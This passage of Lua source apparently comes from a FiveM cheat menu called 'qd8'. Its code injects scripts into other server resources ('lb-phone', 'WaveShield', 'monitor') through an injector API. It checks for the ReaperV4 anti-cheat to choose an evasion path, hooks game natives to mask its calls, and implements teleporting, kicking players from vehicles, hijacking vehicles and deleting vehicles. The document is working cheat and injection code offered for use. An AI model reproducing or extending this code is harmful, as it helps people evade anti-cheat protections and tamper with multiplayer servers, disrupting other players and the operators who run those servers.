                                        TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                    elseif seat >= 0 then
                                        TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                    else
                                        print("[^5qd8^7]: There aren't any seats available in this vehicle.")
                                    end
                                else
                                    MachoInjectThread(0, "any", "", [[ 
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        SetEntityCoords(PlayerPedId(), ]] .. endCoords.x .. [[, ]] .. endCoords.y .. [[, ]] .. endCoords.z .. [[, false, false, false, false)
                                    ]])
                                end
                            else
                                print("[^5qd8^7]: There aren't any valid locations to teleport to.")
                            end
                        end
                    end
                elseif action == "Kick from Vehicle" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            local targetRes = (GetResourceState("lb-phone") == "started" and "lb-phone")
                                or (GetResourceState("WaveShield") == "started" and "WaveShield")
                                or "any"

                            Injection(targetRes, [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]])
                    else
                        if _G.qd8FreecamObject then
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G.qd8FreecamObject)
                            local rot = GetCamRot(_G.qd8FreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function KickFromVehicle(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        MachoInjectResource("monitor", [[
                                            DeletePed(]] .. driver .. [[)
                                        ]])
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        KickFromVehicle(vehicle)
                                    end
                                end
                            end)
                        end
                    end
                elseif action == "Hijack Vehicle" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            local targetRes = (GetResourceState("lb-phone") == "started" and "lb-phone")
                                or (GetResourceState("WaveShield") == "started" and "WaveShield")
                                or "any"

                            Injection(targetRes, [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]])
                    else
                        if _G.qd8FreecamObject then
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G.qd8FreecamObject)
                            local rot = GetCamRot(_G.qd8FreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        MachoInjectResource("monitor", [[
                                            DeletePed(]] .. driver .. [[)
                                        ]])
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        end
                    end
                elseif action == "Delete Vehicle" then
                    if GetResourceState("ReaperV4") ~= "started" or GetCurrentServerEndpoint() == "216.146.24.88:30120" then
                            local targetRes = (GetResourceState("lb-phone") == "started" and "lb-phone")
                                or (GetResourceState("WaveShield") == "started" and "WaveShield")
                                or "any"

                            Injection(targetRes, [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        ]])
                    else
                        if _G.qd8FreecamObject then
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G.qd8FreecamObject)
                            local rot = GetCamRot(_G.qd8FreecamObject, 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        MachoInjectResource("monitor", [[
                                            DeletePed(]] .. driver .. [[)
                                        ]])
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    MachoInjectResource("monitor", [[
                                        DeleteEntity(]] .. vehicle .. [[)
                                    ]])
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    MachoInjectResource("monitor", [[
                                        DeleteEntity(]] .. vehicle .. [[)
                                    ]])
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        end
                    end
                end
            end
        end

        local hoveredTab = CurrentMenu[HoveredIndex]

        if hoveredTab then
            if hoveredTab.type == "slider" or hoveredTab.type == "slider-checkbox" then
                local maxVal = hoveredTab.max or 100
                local now = GetGameTimer()

                if maxVal <= 10 then
                    if IsControlPressed(0, 174) and now - lastSliderPress > sliderDelay then
                        qd8:ScrollTwo("Left")
                        lastSliderPress = now
                    elseif IsControlPressed(0, 175) and now - lastSliderPress > sliderDelay then
                        qd8:ScrollTwo("Right")
                        lastSliderPress = now
                    end
                else
                    if IsControlPressed(0, 174) then
                        qd8:ScrollTwo("Left")
                    elseif IsControlPressed(0, 175) then
                        qd8:ScrollTwo("Right")
                    end
                end
            end
        end
    end
end)

local lastScrollPress = 0
local scrollDelay = 120
local lastSliderPress = 0
local sliderDelay = 120
local lastCategoryPress = 0
local categoryDelay = 120

MachoOnKeyDown(function(Callback)
    local keyCode = tonumber(Callback) or Callback
    local keyName = MappedKeys[keyCode] or "Unknown"
    local scrollNow = GetGameTimer()

    if keyName == MenuKey then
        if not IsVisible and MenuOpenable then
            qd8:ShowUI()
        end
    elseif keyName == "Backspace" then
